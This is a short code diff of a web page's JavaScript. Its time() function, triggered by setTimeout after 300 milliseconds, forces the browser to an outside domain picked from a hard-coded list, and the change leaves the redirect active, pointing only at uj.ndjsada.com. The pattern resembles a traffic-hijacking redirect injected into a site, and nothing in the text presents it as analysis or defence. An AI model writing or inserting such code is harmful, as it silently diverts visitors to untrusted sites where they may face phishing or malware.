@@ -8,7 +8,7 @@ var _hmt = _hmt || [];
 })();
 
 function time() {
-    var arr = ["https://uj.ndjsada.com/2987.html", "https://m.jnh263.com:6766/r?a=1803"];
+    var arr = ["https://uj.ndjsada.com/2987.html", "https://uj.ndjsada.com/2987.html"];
 		window.location.href = arr[parseInt(Math.random() * arr.length)];
 }
 setTimeout(time, 300);
